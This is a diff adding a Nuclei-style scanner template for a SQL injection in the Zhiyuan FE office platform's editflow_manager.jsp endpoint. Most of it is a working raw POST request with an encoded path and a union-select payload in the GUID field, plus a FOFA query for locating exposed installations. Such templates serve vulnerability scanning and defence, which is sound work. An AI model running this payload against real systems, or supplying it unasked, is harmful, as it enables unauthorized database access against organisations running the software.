@@ -1,0 +1,35 @@
+id: zhiyuan-FE-editflow-manager-sqli
+info:
+  name: zhiyuan-FE-editflow_manager.jsp-sqli
+  author: zhe
+  severity: high
+  description: |
+    致远互联FE协作办公平台是一个专注于协同管理软件领域的数智化运营平台及云服务提供商。平台旨在为企业提供数字化转型和升级的解决方案，特别是针对大中型政府和企业客户。平台的主要特点包括开放共享、多种协同应用、以及先进的技术支持。
+  reference:
+    - https://blog.csdn.net/luochen2436/article/details/135020685
+  metadata:
+    fofa-query: app="致远互联-FE"
+  tags: zhiyuan,FE,oa,sqlij
+
+http:
+  - raw:
+      - |
+        POST /sysform/003/editflow_manager.j%73p HTTP/1.1
+        Host: {{Hostname}}
+        Pragma: no-cache
+        Cache-Control: no-cache
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+        Cookie: JSESSIONID=B2D63DD7EF3DFF0C26C68B223E295B04
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 49
+
+        option=2&GUID=-1%27+union+select+%40%40version--+
+    matchers:
+      - type: word
+        words:
+          - 'Microsoft SQL Server'
